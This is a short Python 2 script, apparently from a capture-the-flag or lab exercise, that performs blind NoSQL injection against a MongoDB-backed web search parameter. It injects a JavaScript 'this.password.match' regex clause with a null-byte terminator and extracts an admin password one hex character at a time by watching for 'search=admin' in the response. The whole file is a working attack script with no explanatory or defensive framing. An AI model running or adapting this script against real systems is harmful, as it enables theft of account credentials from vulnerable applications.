#!/bin/python
# MongoDB password match script

import requests as req
import re

URL = "http://REDACTED/"
PATTERN = "search=admin"
FORMAT = "XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"
alpha = "abcdef0123456789"
password = ""
payload = ""

for c in FORMAT:
        if c == "-":
                password = password + "-"
        else:
                for i in alpha:
                        payload = "/^"+password+i+".*$/"
                        params = "?search=admin'%20%26%26%20this.password.match("+payload+")%00"
                        r = req.get(URL+params)
                        if (re.search(PATTERN,r.text)):
                                password = password + i
                                break
print password
